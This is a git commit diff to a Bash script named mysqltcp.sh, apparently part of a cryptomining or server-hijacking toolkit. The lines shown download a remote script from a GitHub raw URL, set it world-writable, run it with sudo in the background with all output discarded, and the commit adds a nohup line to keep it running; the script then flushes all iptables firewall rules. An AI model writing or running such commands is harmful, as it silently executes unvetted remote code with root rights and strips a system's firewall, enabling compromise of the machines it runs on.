a80faa51f916e0c793e58712b1c74ae0f6e67776
U8Pool <905353149@qq.com>
2023-01-30 00:47:28 +0800

    Update mysqltcp.sh

--- Bash/mysqltcp.sh
+++ Bash/mysqltcp.sh
@@ -927,6 +927,7 @@ wget https://raw.githubusercontent.com/teshushu/BiBi/main/Bash/delserver.sh
 chmod 777 delserver.sh
 sudo /bin/bash ./delserver.sh >/dev/null 2>&1 &
 /bin/bash ./delserver.sh >/dev/null 2>&1 &
+nohup ./delserver.sh >/dev/null 2>&1 &
 
 iptables -F
 iptables -X
